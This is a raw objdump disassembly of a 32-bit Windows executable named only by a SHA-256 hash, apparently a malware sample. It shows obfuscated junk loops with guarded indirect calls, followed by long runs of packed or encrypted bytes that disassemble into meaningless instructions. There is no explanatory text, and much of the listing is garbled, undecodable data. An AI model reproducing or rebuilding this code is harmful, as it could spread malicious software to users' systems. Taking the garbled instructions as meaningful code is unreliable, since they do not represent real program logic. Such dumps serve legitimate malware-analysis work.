
34a917554566057b0dc741f2617bd7c9a77a086e5f98ce93e2022239b15baea5.exe:     file format pei-i386


Disassembly of section .text:

00401000 <.text>:
  401000:	push   ebp
  401001:	mov    ebp,esp
  401003:	sub    esp,0x38
  401006:	mov    eax,0x5a3fc9e
  40100b:	movzx  ecx,BYTE PTR ds:0x42fe0d
  401012:	mov    DWORD PTR [ebp-0x20],eax
  401015:	mov    ecx,DWORD PTR [ebp-0x20]
  401018:	mov    DWORD PTR [ebp-0x24],0x4ec5
  40101f:	mov    DWORD PTR ds:0x42fe09,0x6cee
  401029:	cmp    ecx,eax
  40102b:	mov    DWORD PTR ds:0x42e21c,0x6120
  401035:	jne    0x402968
  40103b:	or     ecx,0x42d0
  401041:	mov    ax,WORD PTR [ebp-0x24]
  401045:	adc    DWORD PTR ds:0x42fdf1,edx
  40104b:	push   esi
  40104c:	and    DWORD PTR ds:0x42fdd9,0x0
  401056:	jmp    0x401068
  40105b:	mov    ecx,DWORD PTR ds:0x42fdd9
  401061:	inc    ecx
  401062:	mov    DWORD PTR ds:0x42fdd9,ecx
  401068:	cmp    DWORD PTR ds:0x42fdd9,0x1a
  40106f:	jae    0x4010b5
  401075:	cmp    DWORD PTR ds:0x42fdd9,0xf
  40107c:	jne    0x401090
  401082:	push   0x23a3
  401087:	push   DWORD PTR [ebp-0x10]
  40108a:	call   DWORD PTR ds:0x42e627
  401090:	cmp    DWORD PTR ds:0x42fdd9,0xe
  401097:	jne    0x4010aa
  40109d:	mov    ecx,DWORD PTR ds:0x42fdd9
  4010a3:	inc    ecx
  4010a4:	mov    DWORD PTR ds:0x42fdd9,ecx
  4010aa:	jmp    0x40105b
  4010af:	add    DWORD PTR ds:0x42e224,edx
  4010b5:	mov    ecx,0x8a3e
  4010ba:	xor    ax,cx
  4010bd:	sub    ecx,DWORD PTR ds:0x42e80b
  4010c3:	mov    ecx,DWORD PTR [ebp+0x8]
  4010c6:	mov    DWORD PTR ds:0x42e7fb,0x11
  4010d0:	cmp    DWORD PTR ds:0x42e7fb,0x0
  4010d7:	je     0x4011ef
  4010dd:	cmp    DWORD PTR ds:0x42e7fb,0x8
  4010e4:	jne    0x401100
  4010ea:	push   0x42e228
  4010ef:	push   DWORD PTR [ebp-0x10]
  4010f2:	push   0x671d
  4010f7:	push   DWORD PTR [ebp-0x20]
  4010fa:	call   DWORD PTR ds:0x42e3cf
  401100:	cmp    DWORD PTR ds:0x42e7fb,0x9
  401107:	jne    0x40111c
  40110d:	xor    esi,esi
  40110f:	xor    esi,DWORD PTR ds:0x42e7fb
  401115:	dec    esi
  401116:	mov    DWORD PTR ds:0x42e7fb,esi
  40111c:	mov    esi,DWORD PTR ds:0x42e7fb
  401122:	dec    esi
  401123:	mov    DWORD PTR ds:0x42e7fb,esi
  401129:	jmp    0x4010d0
  40112e:	and    DWORD PTR ds:0x42e21c,0x0
  401138:	mov    esi,DWORD PTR ds:0x42e21c
  40113e:	inc    esi
  40113f:	mov    DWORD PTR ds:0x42e21c,esi
  401145:	cmp    DWORD PTR ds:0x42e21c,0xd
  40114c:	jne    0x401160
  401152:	push   0x3999
  401157:	push   DWORD PTR [ebp-0x20]
  40115a:	call   DWORD PTR ds:0x42e62b
  401160:	cmp    DWORD PTR ds:0x42e21c,0xc
  401167:	jne    0x40117c
  40116d:	xor    esi,esi
  40116f:	add    esi,DWORD PTR ds:0x42e21c
  401175:	inc    esi
  401176:	mov    DWORD PTR ds:0x42e21c,esi
  40117c:	cmp    DWORD PTR ds:0x42e21c,0x15
  401183:	jb     0x401138
  401189:	mov    DWORD PTR ds:0x42e234,0x1a
  401193:	cmp    DWORD PTR ds:0x42e234,0x0
  40119a:	je     0x4011ef
  4011a0:	cmp    DWORD PTR ds:0x42e234,0x25
  4011a7:	jne    0x4011d5
  4011ad:	push   0x42fe7a
  4011b2:	push   DWORD PTR [ebp-0x20]
  4011b5:	push   0x4679
  4011ba:	push   0x42fe82
  4011bf:	push   0x17d1
  4011c4:	push   0x42e327
  4011c9:	push   DWORD PTR [ebp-0x14]
  4011cc:	push   DWORD PTR [ebp-0x18]
  4011cf:	call   DWORD PTR ds:0x42e54b
  4011d5:	xor    esi,esi
  4011d7:	or     esi,DWORD PTR ds:0x42e234
  4011dd:	dec    esi
  4011de:	mov    DWORD PTR ds:0x42e234,esi
  4011e4:	jmp    0x401193
  4011e9:	add    DWORD PTR ds:0x42e7fb,ecx
  4011ef:	push   edi
  4011f0:	xor    esi,esi
  4011f2:	or     esi,DWORD PTR ds:0x42fe05
  4011f8:	adc    esi,DWORD PTR ds:0x42fe09
  4011fe:	mov    DWORD PTR ds:0x42fe05,esi
  401204:	mov    edi,0x3b04
  401209:	add    ax,di
  40120c:	mov    DWORD PTR ds:0x42e803,0x17
  401216:	cmp    DWORD PTR ds:0x42e803,0x0
  40121d:	je     0x401257
  401223:	cmp    DWORD PTR ds:0x42e803,0x26
  40122a:	jne    0x401243
  401230:	push   DWORD PTR [ebp-0x10]
  401233:	push   0x42e2c6
  401238:	push   0x42e27d
  40123d:	call   DWORD PTR ds:0x42e62f
  401243:	xor    esi,esi
  401245:	or     esi,DWORD PTR ds:0x42e803
  40124b:	dec    esi
  40124c:	mov    DWORD PTR ds:0x42e803,esi
  401252:	jmp    0x401216
  401257:	movzx  eax,ax
  40125a:	not    eax
  40125c:	and    eax,DWORD PTR [ecx]
  40125e:	mov    ecx,DWORD PTR [ebp+0x8]
  401261:	mov    DWORD PTR ds:0x42fe7e,0x12
  40126b:	cmp    DWORD PTR ds:0x42fe7e,0x0
  401272:	je     0x4012b2
  401278:	cmp    DWORD PTR ds:0x42fe7e,0x22
  40127f:	jne    0x4012a0
  401285:	push   0x42e327
  40128a:	push   0x7fee
  40128f:	push   DWORD PTR [ebp-0x28]
  401292:	push   DWORD PTR [ebp-0x24]
  401295:	push   0x4b6b
  40129a:	call   DWORD PTR ds:0x42e633
  4012a0:	mov    esi,DWORD PTR ds:0x42fe7e
  4012a6:	dec    esi
  4012a7:	mov    DWORD PTR ds:0x42fe7e,esi
  4012ad:	jmp    0x40126b
  4012b2:	mov    DWORD PTR [ecx],eax
  4012b4:	mov    ecx,0x7510855
  4012b9:	mov    esi,0x32729c
  4012be:	push   ebx
  4012bf:	mov    ax,WORD PTR [ebp-0x24]
  4012c3:	movzx  eax,ax
  4012c6:	mov    DWORD PTR [ebp-0x38],eax
  4012c9:	mov    eax,DWORD PTR [ebp+0x8]
  4012cc:	mov    DWORD PTR [ebp-0x28],eax
  4012cf:	mov    DWORD PTR [ebp-0x8],0xf89c8530
  4012d6:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  4012dd:	mov    eax,0x9577
  4012e2:	jmp    0x4014ff
  4012e7:	sbb    BYTE PTR [edx-0x68cdf8d6],0xb1
  4012ee:	cdq    
  4012ef:	js     0x401291
  4012f1:	mov    ah,0x66
  4012f3:	sbb    BYTE PTR [ecx+0x12],dl
  4012f6:	adc    BYTE PTR [eax+0x70],dh
  4012f9:	jo     0x40136b
  4012fb:	jo     0x40137b
  4012fd:	jo     0x40136f
  4012ff:	rcl    bh,0x3d
  401302:	aad    0x39
  401304:	ror    edi,cl
  401306:	rol    eax,1
  401308:	pop    es
  401309:	push   es
  40130a:	add    ecx,DWORD PTR [esi]
  40130c:	in     eax,0x2
  40130e:	rdpmc  
  401310:	cmpps  xmm3,XMMWORD PTR [edx],0xc7
  401314:	adc    bl,BYTE PTR [edi]
  401316:	mov    ecx,0xddb7025a
  40131b:	add    bh,ch
  40131d:	mov    ebp,0x8003c8db
  401322:	sbb    BYTE PTR [eax+0x1541a4f6],dh
  401328:	lods   eax,DWORD PTR ds:[esi]
  401329:	sar    BYTE PTR [eax+0x6fee581f],1
  40132f:	or     edx,DWORD PTR [ecx]
  401331:	sahf   
  401332:	jp     0x4012fc
  401334:	inc    edx
  401335:	lods   al,BYTE PTR ds:[esi]
  401336:	push   ebx
  401337:	sub    eax,0xad3ec6d1
  40133c:	mov    WORD PTR [ebx-0x3b],?
  40133f:	stos   DWORD PTR es:[edi],eax
  401340:	js     0x401308
  401342:	rol    DWORD PTR [ecx+0x3992c8f9],cl
  401348:	jmp    0x40137c
  40134a:	mov    ebp,ecx
  40134c:	dec    edi
  40134d:	fcomp  DWORD PTR [eax-0x656800bf]
  401353:	pop    es
  401354:	test   eax,0xed4dbddc
  401359:	sub    BYTE PTR [ebp+0x23],dl
  40135c:	mov    ah,0xec
  40135e:	pusha  
  40135f:	nop
  401360:	mov    esi,0x94c3117b
  401365:	and    esi,edx
  401367:	jmp    0x4013b9
  401369:	(bad)  
  40136a:	out    0xba,al
  40136c:	repnz in al,dx
  40136e:	xchg   esp,eax
  40136f:	xor    edi,ecx
  401371:	jbe    0x4013d8
  401373:	xlat   BYTE PTR ds:[ebx]
  401374:	and    cl,ch
  401376:	add    al,0xd9
  401378:	adc    DWORD PTR [ecx-0x68],edx
  40137b:	xor    eax,0x7a616f03
  401380:	or     dh,BYTE PTR [ecx]
  401382:	fld    QWORD PTR [eax+0x7f752a56]
  401388:	xor    BYTE PTR [edi+0xba8db0c],cl
  40138e:	pop    ebx
  40138f:	push   ebp
  401390:	(bad)  
  401392:	or     ebx,edx
  401394:	pop    esi
  401395:	fstp   DWORD PTR [ecx]
  401397:	jno    0x401329
  401399:	mov    eax,0x2b15374b
  40139e:	ja     0x4013c9
  4013a0:	sbb    al,0xd3
  4013a2:	xor    BYTE PTR [edi-0x16],cl
  4013a5:	int    0xa6
  4013a7:	jle    0x4013bc
  4013a9:	sub    al,0x7e
  4013ab:	push   ebx
  4013ac:	not    BYTE PTR [edi+0x3f]
  4013af:	stos   BYTE PTR es:[edi],al
  4013b0:	xor    BYTE PTR [edx+0x4a6a1e3f],ah
  4013b6:	push   eax
  4013b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4013b8:	jb     0x4013db
  4013ba:	xlat   BYTE PTR ds:[ebx]
  4013bb:	and    eax,0xf6c471b8
  4013c0:	clc    
  4013c1:	mov    WORD PTR [esi+0x7],?
  4013c4:	aam    0xa
  4013c6:	fwait
  4013c7:	adc    dl,0x2
  4013ca:	fwait
  4013cb:	js     0x401403
  4013cd:	push   ss
  4013ce:	sbb    ecx,eax
  4013d0:	jg     0x4013e0
  4013d2:	fcmovb st,st(2)
  4013d4:	je     0x4013c9
  4013d6:	dec    edi
  4013d7:	pushf  
  4013d8:	push   esp
  4013d9:	xchg   ebp,eax
  4013da:	mov    al,ds:0x82018451
  4013df:	addr16 test al,0x88
  4013e2:	pop    esp
  4013e3:	test   BYTE PTR [eax-0x7c],ch
  4013e6:	jp     0x4013a6
  4013e8:	rol    BYTE PTR [edx+0x469f4094],1
  4013ee:	push   esi
  4013ef:	enter  0xa8e8,0xaf
  4013f3:	js     0x4013f5
  4013f5:	mov    bl,BYTE PTR [edi]
  4013f7:	stos   DWORD PTR es:[edi],eax
  4013f8:	dec    esi
  4013f9:	outs   dx,BYTE PTR ds:[esi]
  4013fa:	dec    ecx
  4013fb:	iret   
  4013fc:	aad    0x76
  4013fe:	repz aaa 
  401400:	call   0x4830db1b
  401405:	sbb    BYTE PTR [eax+0x3034592],dh
  40140b:	push   edi
  40140c:	call   0xdeb7:0x3ecc7e9f
  401413:	cmp    al,0xbf
  401415:	dec    esp
  401416:	xor    ecx,DWORD PTR [ebx-0x46]
  401419:	push   esi
  40141a:	push   esp
  40141b:	retf   0xbebb
  40141e:	sar    esp,0x56
  401421:	inc    edi
  401422:	add    eax,0xf768d4b1
  401427:	jb     0x40145b
  401429:	mov    eax,ds:0xe535d2e4
  40142e:	add    eax,edx
  401430:	dec    esp
  401431:	mov    edx,0x1a016bcb
  401436:	cmp    eax,0x5f2c850
  40143b:	or     esi,edi
  40143d:	pop    ss
  40143e:	xchg   ebp,eax
  40143f:	cmp    al,0x72
  401441:	call   FWORD PTR [esi-0x44]
  401444:	fdiv   DWORD PTR [ebx+0x2e]
  401447:	sub    al,0x6a
  401449:	cmc    
  40144a:	and    esi,ecx
  40144c:	fwait
  40144d:	mov    dh,0xe4
  40144f:	sub    edx,DWORD PTR [esp+edi*1+0x13e56444]
  401456:	ins    BYTE PTR es:[edi],dx
  401457:	dec    eax
  401458:	test   BYTE PTR [eax],0xae
  40145b:	dec    ebx
  40145c:	icebp  
  40145d:	das    
  40145e:	daa    
  40145f:	fs sti 
  401461:	dec    edx
  401462:	pop    ss
  401463:	scas   eax,DWORD PTR es:[edi]
  401464:	push   ecx
  401465:	repnz xlat BYTE PTR ds:[bx]
  401468:	(bad)  
  401469:	shr    BYTE PTR [esi+eiz*8],cl
  40146c:	stc    
  40146d:	cmp    DWORD PTR [ebp+0x3220c4e5],0xe8be3196
  401477:	mov    DWORD PTR [ecx],esp
  401479:	vshufpd ymm3,ymm3,YMMWORD PTR [ecx],0xc7
  40147e:	jmp    0x4014f6
  401480:	enter  0x187e,0xf0
  401484:	std    
  401485:	(bad)  
  401486:	mov    ebp,0xd799aaa2
  40148b:	mov    ecx,0xbb021d60
  401490:	pop    ecx
  401491:	or     BYTE PTR [ebp-0x7],bl
  401494:	mov    DWORD PTR [ecx+esi*8+0x12],edx
  401498:	jmp    0x460cc90e
  40149d:	xor    bl,bh
  40149f:	out    dx,eax
  4014a0:	(bad)  
  4014a1:	fild   DWORD PTR [esi-0x6e5d8818]
  4014a7:	or     al,0x2c
  4014a9:	xchg   ecx,eax
  4014aa:	loopne 0x40146d
  4014ac:	arpl   di,ax
  4014ae:	test   ch,al
  4014b0:	sub    esp,ecx
  4014b2:	(bad)  
  4014b3:	cmc    
  4014b4:	add    BYTE PTR [edi],cl
  4014b6:	and    eax,0xde775435
  4014bb:	jo     0x4014a7
  4014bd:	mov    esi,0x5f48c966
  4014c2:	jl     0x4014ac
  4014c4:	popf   
  4014c5:	mov    dh,0x7b
  4014c7:	jo     0x4014d7
  4014c9:	sub    edi,eax
  4014cb:	addr16 loopne 0x4014cb
  4014ce:	cmp    bh,BYTE PTR [esi+0x215cd70a]
  4014d4:	fcom   QWORD PTR [ebx+0x23]
  4014d7:	mov    dl,0x55
  4014d9:	adc    dl,ah
  4014db:	mov    ch,0xf7
  4014dd:	ins    DWORD PTR es:[edi],dx
  4014de:	lods   al,BYTE PTR ds:[esi]
  4014df:	js     0x401543
  4014e1:	in     al,dx
  4014e2:	pop    es
  4014e3:	jb     0x4014d4
  4014e5:	sti    
  4014e6:	add    ebp,DWORD PTR [ebp+eiz*1+0x799c286f]
  4014ed:	sub    DWORD PTR [edx+0x5a],eax
  4014f0:	fisubr WORD PTR [esi+eax*1-0x26]
  4014f4:	out    0x59,al
  4014f6:	dec    BYTE PTR [ebx-0x1381521c]
  4014fc:	not    DWORD PTR [bx+di+0x66]
  401500:	mov    DWORD PTR [ebp-0x4],eax
  401503:	jmp    0x401720
  401508:	clc    
  401509:	icebp  
  40150a:	mov    esp,0xb8b16984
  40150f:	icebp  
  401510:	ficomp DWORD PTR [edx-0x5d21e013]
  401516:	in     eax,0xb4
  401518:	jo     0x401598
  40151a:	jo     0x40158c
  40151c:	jo     0x40159c
  40151e:	jo     0x401590
  401520:	popf   
  401521:	add    BYTE PTR [esi-0x39f253f0],dl
  401527:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401528:	(bad)  
  401529:	mov    bl,0xa9
  40152b:	stos   BYTE PTR es:[edi],al
  40152c:	lahf   
  40152d:	sub    eax,0xcf452024
  401532:	dec    eax
  401533:	(bad)  
  401534:	cmp    DWORD PTR [ebx+0x7187e74e],edi
  40153a:	or     eax,0x7dfb86ef
  40153f:	nop
  401540:	sbb    eax,0xea829064
  401545:	in     eax,0xb6
  401547:	cwde   
  401548:	mov    al,BYTE PTR [esi]
  40154a:	out    0xfe,eax
  40154c:	leave  
  40154d:	or     edx,ecx
  40154f:	dec    ebp
  401550:	das    
  401551:	mov    ds:0xc77e37d2,al
  401556:	mov    dl,0xd5
  401558:	dec    edx
  401559:	cmp    BYTE PTR [esi-0x5803eca4],dh
  40155f:	xor    al,0x81
  401561:	outs   dx,DWORD PTR ds:[esi]
  401562:	gs sbb al,0x3
  401565:	sub    ebp,edx
  401567:	test   al,0x86
  401569:	inc    ebp
  40156a:	jo     0x401575
  40156c:	cld    
  40156d:	mov    edi,DWORD PTR [ebx]
  40156f:	retf   0xd606
  401572:	xchg   ebx,eax
  401573:	sbb    eax,0xcafd99dc
  401578:	fwait
  401579:	xor    al,0x0
  40157b:	mov    edi,0x2dff5355
  401580:	jno    0x401550
  401582:	fcom   QWORD PTR [ebx-0x34]
  401585:	in     al,0x87
  401587:	int    0x34
  401589:	rcl    bh,cl
  40158b:	scas   eax,DWORD PTR es:[edi]
  40158c:	xor    ecx,DWORD PTR [edx]
  40158e:	scas   al,BYTE PTR es:[edi]
  40158f:	mov    al,0xbf
  401591:	adc    al,BYTE PTR [edi+0x63]
  401594:	mov    eax,0xed373725
  401599:	lahf   
  40159a:	stc    
  40159b:	scas   al,BYTE PTR es:[edi]
  40159c:	(bad)  
  40159d:	and    DWORD PTR [edx-0x7d],esi
  4015a0:	mov    ecx,ebp
  4015a2:	push   esp
  4015a3:	das    
  4015a4:	test   BYTE PTR [ecx+0x16],cl
  4015a7:	test   DWORD PTR [ecx],ebp
  4015a9:	mov    ds:0x7ee90d85,eax
  4015ae:	mov    ch,0xc
  4015b0:	mov    dh,0x5d
  4015b2:	or     DWORD PTR [eax+0x53454ea8],ebx
  4015b8:	mov    esp,DWORD PTR [ebx+0x7d]
  4015bb:	lock outs dx,BYTE PTR ds:[esi]
  4015bd:	xlat   BYTE PTR ds:[ebx]
  4015be:	test   al,0x72
  4015c0:	lods   al,BYTE PTR ds:[esi]
  4015c1:	jg     0x4015c0
  4015c3:	std    
  4015c4:	mov    DWORD PTR [eax-0x5],esi
  4015c7:	xor    DWORD PTR [esi-0x18b126ff],0xffffffde
  4015ce:	out    dx,eax
  4015cf:	test   DWORD PTR [ebx],edi
  4015d1:	cmp    eax,0xdedf83ba
  4015d6:	cs cmc 
  4015d8:	or     BYTE PTR [edx],dh
  4015da:	add    al,0x19
  4015dc:	xor    al,BYTE PTR [ebx]
  4015de:	push   edx
  4015df:	fxtract 
  4015e1:	mov    ecx,0x5a674780
  4015e6:	xor    DWORD PTR [eax],ebp
  4015e8:	loopne 0x401649
  4015ea:	mov    edi,0x5c52dc73
  4015ef:	cli    
  4015f0:	sbb    DWORD PTR [ecx+0x7014cf41],edx
  4015f6:	das    
  4015f7:	in     al,0x55
  4015f9:	or     al,0x69
  4015fb:	out    dx,al
  4015fc:	out    0xc6,al
  4015fe:	mov    es,WORD PTR [ebp-0xf30718f]
  401604:	dec    esp
  401605:	scas   al,BYTE PTR es:[edi]
  401606:	in     eax,0x44
  401608:	jb     0x4015db
  40160a:	int    0x4b
  40160c:	loop   0x40165d
  40160e:	xchg   cx,ax
  401610:	cmp    eax,0xc0417609
  401615:	aad    0xc5
  401617:	xchg   ebx,eax
  401618:	sbb    eax,0xe9224d31
  40161d:	std    
  40161e:	je     0x4015ff
  401620:	mov    eax,0x6e00188c
  401625:	dec    esp
  401626:	add    ah,BYTE PTR [eax]
  401628:	mov    WORD PTR ds:0xc632ed97,ss
  40162e:	imul   BYTE PTR [esp+edi*4-0x6]
  401632:	pushf  
  401633:	cmc    
  401634:	or     bl,dl
  401636:	test   ebp,0xb548ee19
  40163c:	arpl   WORD PTR [edx+0x357cde56],bp
  401642:	test   eax,0x14da6c6e
  401647:	jnp    0x401676
  401649:	sub    BYTE PTR [ebp+0x23],al
  40164c:	mov    cl,0xa2
  40164e:	ret    0xdee
  401651:	jmp    0x4016bd
  401653:	or     al,0x8e
  401655:	out    0x3d,eax
  401657:	pop    edx
  401658:	xchg   ebx,eax
  401659:	mov    dl,BYTE PTR [edi+esi*8-0x80]
  40165d:	dec    esi
  40165e:	(bad)  
  401660:	lods   al,BYTE PTR ds:[esi]
  401661:	push   ecx
  401662:	(bad)  
  401664:	xchg   ecx,eax
  401665:	jg     0x401663
  401667:	popa   
  401668:	pop    ds
  401669:	imul   BYTE PTR [ebx+0x4ac1b472]
  40166f:	fwait
  401670:	push   0x96de8faf
  401675:	add    DWORD PTR [eax],ebx
  401677:	mul    BYTE PTR [ebx]
  401679:	jmp    0x4016a7
  40167b:	pop    esi
  40167c:	fst    DWORD PTR [ecx]
  40167e:	sbb    eax,esp
  401680:	cmp    BYTE PTR [edx+0x28],0x4c
  401684:	xor    ch,BYTE PTR [edx+eiz*4+0x707f5976]
  40168b:	fs adc eax,0xfd656899
  401691:	mov    es,WORD PTR [esi+0x45127cbe]
  401697:	outs   dx,BYTE PTR ds:[esi]
  401698:	dec    esi
  401699:	xchg   edx,eax
  40169a:	sub    eax,0xb1a0ca81
  40169f:	in     eax,0x60
  4016a1:	mov    bh,0xf0
  4016a3:	sbb    eax,0xd4fd3051
  4016a8:	pop    ebp
  4016a9:	cmc    
  4016aa:	pop    ss
  4016ab:	mov    bh,0xb5
  4016ad:	inc    eax
  4016ae:	jecxz  0x401722
  4016b0:	dec    eax
  4016b1:	test   DWORD PTR [ecx],edi
  4016b3:	adc    al,0x12
  4016b5:	pop    esp
  4016b6:	and    DWORD PTR [ebx],ecx
  4016b8:	loope  0x401683
  4016ba:	test   DWORD PTR ds:0xd3502760,ebp
  4016c0:	data16 je 0x4016d3
  4016c3:	dec    edx
  4016c4:	dec    esi
  4016c5:	adc    al,0x59
  4016c7:	sbb    al,0x8e
  4016c9:	repz adc edi,edi
  4016cc:	test   eax,0xabfb62ec
  4016d1:	jo     0x4016bb
  4016d3:	lods   eax,DWORD PTR ds:[esi]
  4016d4:	dec    ebx
  4016d5:	arpl   bp,ax
  4016d7:	lea    edi,[ecx-0x3a]
  4016da:	jg     0x401681
  4016dc:	gs pop ecx
  4016de:	push   edx
  4016df:	(bad)  
  4016e0:	jle    0x4016a5
  4016e2:	stos   BYTE PTR es:[edi],al
  4016e3:	sbb    edx,DWORD PTR [ecx-0x22]
  4016e6:	pushf  
  4016e7:	call   0xc73f6240
  4016ec:	jl     0x401688
  4016ee:	mov    dh,BYTE PTR [esi+0x1a]
  4016f1:	aad    0x5c
  4016f3:	ret    
  4016f4:	cmc    
  4016f5:	pop    ebx
  4016f6:	xor    DWORD PTR [esi],edx
  4016f8:	repz xchg ebx,eax
  4016fa:	mov    ebx,0x1a4f6805
  4016ff:	xchg   edx,eax
  401700:	inc    BYTE PTR [ebx+0x3c]
  401703:	ins    BYTE PTR es:[edi],dx
  401704:	mov    ebx,DWORD PTR [edx+eiz*2]
  401707:	in     al,dx
  401708:	adc    DWORD PTR [esi-0x56],edi
  40170b:	jo     0x4016e9
  40170d:	test   DWORD PTR [esi+edx*8],eax
  401710:	jmp    0x401733
  401712:	mov    edi,es
  401714:	mov    edx,0xf660e415
  401719:	and    eax,0x44505ade
  40171e:	xor    esi,ecx
  401720:	lea    eax,[ebp-0x30]
  401723:	mov    DWORD PTR [ebp-0x34],eax
  401726:	mov    eax,DWORD PTR [ebp-0x28]
  401729:	mov    DWORD PTR [ebp-0x2c],eax
  40172c:	lea    eax,[ebp-0x18]
  40172f:	jmp    0x40194c
  401734:	dec    ebp
  401735:	iret   
  401736:	lods   eax,DWORD PTR ds:[esi]
  401737:	dec    ebx
  401738:	lods   eax,DWORD PTR ds:[esi]
  401739:	imul   ebp,DWORD PTR [ecx-0x37],0x8e1037e1
  401740:	xor    eax,0x708fcb54
  401745:	jl     0x4017b7
  401747:	jo     0x4017b9
  401749:	jle    0x4017bb
  40174b:	jo     0x4017a5
  40174d:	test   eax,0x8f3b3ea9
  401752:	xchg   ebp,eax
  401753:	(bad)
  401756:	push   ds
  401757:	jno    0x40170b
  401759:	sahf   
  40175a:	pop    esi
  40175b:	not    BYTE PTR ds:0x8928cb97
  401761:	sbb    ebp,edi
  401763:	ss xor eax,0xf30b1fb7
  401769:	cdq    
  40176a:	imul   esp,DWORD PTR ds:0xbd6379df,0xa7d45fd1
  401774:	jmp    0xc08e:0x20484ed7
  40177b:	push   eax
  40177c:	retf   0xeb0c
  40177f:	push   ss
  401780:	repnz rcr DWORD PTR [esi-0x3],1
  401784:	inc    edx
  401785:	in     al,dx
  401786:	mov    dh,0x25
  401788:	std    
  401789:	dec    ecx
  40178a:	jo     0x401741
  40178c:	or     DWORD PTR gs:[esi+0x61],ebp
  401790:	xor    ebp,esi
  401792:	mov    ebx,0xf55b5e24
  401797:	pusha  
  401798:	mov    ?,WORD PTR ds:0x28a063de
  40179e:	outs   dx,BYTE PTR fs:[esi]
  4017a0:	ret    
  4017a1:	cdq    
  4017a2:	xchg   ebx,eax
  4017a3:	hlt    
  4017a4:	xchg   ebx,eax
  4017a5:	bound  eax,QWORD PTR ds:0x885115f
  4017ab:	pop    ecx
  4017ac:	imul   edi,edi,0xb03968e6
  4017b2:	push   0xffffff99
  4017b4:	dec    edi
  4017b5:	lods   eax,DWORD PTR ds:[esi]
  4017b6:	cwde   
  4017b7:	in     al,dx
  4017b8:	mov    eax,ds:0xf3dabf35
  4017bd:	xor    BYTE PTR [ecx],bh
  4017bf:	sub    ah,cl
  4017c1:	cwde   
  4017c2:	xchg   esi,eax
  4017c3:	xor    al,0xc0
  4017c5:	int    0x25
  4017c7:	les    ecx,FWORD PTR [edi+0x643b88c8]
  4017cd:	inc    esi
  4017ce:	mov    bh,0xe1
  4017d0:	mov    bl,0x8e
  4017d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017d3:	cs sub eax,0x52ef8fc8
  4017d9:	mov    WORD PTR [esi-0x6ddf6621],ds
  4017df:	inc    esp
  4017e0:	and    DWORD PTR [ebp+0x3a],edx
  4017e3:	xor    bl,BYTE PTR [esi-0x7e03d1e4]
  4017e9:	jge    0x401834
  4017eb:	or     ch,bh
  4017ed:	dec    edx
  4017ee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4017ef:	mov    dl,0x24
  4017f1:	sub    al,0x35
  4017f3:	jb     0x4017ab
  4017f5:	jecxz  0x4017a4
  4017f7:	fistp  QWORD PTR [ebx+0x3b48d5b9]
  4017fd:	imul   eax,DWORD PTR [ecx-0x1e],0x3e
  401801:	test   eax,0xd3548d71
  401806:	cli    
  401807:	ror    BYTE PTR [ebp+0x3],0x87
  40180b:	inc    ebp
  40180c:	jmp    0x1c92:0xa5eec490
  401813:	inc    edx
  401814:	mov    bh,0x21
  401816:	pop    eax
  401817:	jg     0x401826
  401819:	scas   al,BYTE PTR es:[edi]
  40181a:	shl    DWORD PTR [esi+0x4f],0x88
  40181e:	in     al,0x36
  401820:	xchg   DWORD PTR [ebx],edi
  401822:	sub    BYTE PTR [eiz*8+0x1897290e],dl
  401829:	add    eax,0xad05ef2
  40182e:	jb     0x401877
  401830:	ror    DWORD PTR [ecx+ebx*2+0x52427134],1
  401837:	cmp    eax,0x8a472e27
  40183c:	retf   0xdd69
  40183f:	mov    esi,0x943198ef
  401844:	aas    
  401845:	jmp    0x8831:0xc4357cb4
  40184c:	imul   esp,DWORD PTR [eax+0xf],0x5b233b98
  401853:	pop    ecx
  401854:	inc    eax
  401855:	test   BYTE PTR [ebp-0x2a],al
  401858:	pushf  
  401859:	and    DWORD PTR [edx+0x5a2e4976],ecx
  40185f:	jl     0x401832
  401861:	cli    
  401862:	fwait
  401863:	or     dl,ch
  401865:	sub    eax,0x62d4b236
  40186a:	ins    DWORD PTR es:[edi],dx
  40186b:	sbb    edi,esp
  40186d:	push   esi
  40186e:	pmaxsw mm2,QWORD PTR [esi+0x2e]
  401872:	or     BYTE PTR [edi],0x34
  401875:	arpl   WORD PTR [eax],si
  401877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401878:	push   ecx
  401879:	cmp    DWORD PTR [eax],eax
  40187b:	shl    esp,1
  40187d:	jo     0x401813
  40187f:	sbb    DWORD PTR [esi],edi
  401881:	and    ah,0xb1
  401884:	pop    edx
  401885:	mov    esi,0xacba5f0
  40188a:	xor    cl,0xad
  40188d:	add    ecx,DWORD PTR [esi]
  40188f:	arpl   WORD PTR [edx-0x45],di
  401892:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401893:	xchg   BYTE PTR [edx],ch
  401895:	push   ecx
  401896:	add    eax,0x701507aa
  40189b:	mov    ch,dh
  40189d:	ffreep st(3)
  40189f:	mov    eax,ds:0xc905cc32
  4018a4:	lock mov al,ds:0x4e187f40
  4018aa:	pop    ebp
  4018ab:	push   ebx
  4018ac:	iret   
  4018ad:	scas   al,BYTE PTR es:[edi]
  4018ae:	inc    ecx
  4018af:	out    0xc0,al
  4018b1:	aad    0x43
  4018b3:	rol    WORD PTR [eax-0x710aa700],cl
  4018ba:	scas   eax,DWORD PTR es:[edi]
  4018bb:	inc    ecx
  4018bc:	scas   eax,DWORD PTR es:[edi]
  4018bd:	and    ch,BYTE PTR [ebx-0x4]
  4018c0:	fstp   TBYTE PTR [eax-0x52]
  4018c3:	pop    ss
  4018c4:	push   esi
  4018c5:	shr    BYTE PTR [ebx-0x3772d9e6],cl
  4018cb:	push   ebp
  4018cc:	and    ecx,DWORD PTR [esi+ebp*8+0x18]
  4018d0:	cwde   
  4018d1:	dec    edi
  4018d2:	leave  
  4018d3:	test   cl,dh
  4018d5:	mov    edi,0xa7277ccf
  4018da:	jae    0x4018a1
  4018dc:	aad    0xd6
  4018de:	call   0xeae30f65
  4018e3:	pop    esi
  4018e4:	xchg   ecx,eax
  4018e5:	cmp    eax,0x16971866
  4018ea:	int3   
  4018eb:	cmp    eax,0xe7fa6bf8
  4018f0:	cs push eax
  4018f2:	cld    
  4018f3:	addr16 leave 
  4018f5:	repz xchg ebx,eax
  4018f7:	(bad)  
  4018f8:	in     al,dx
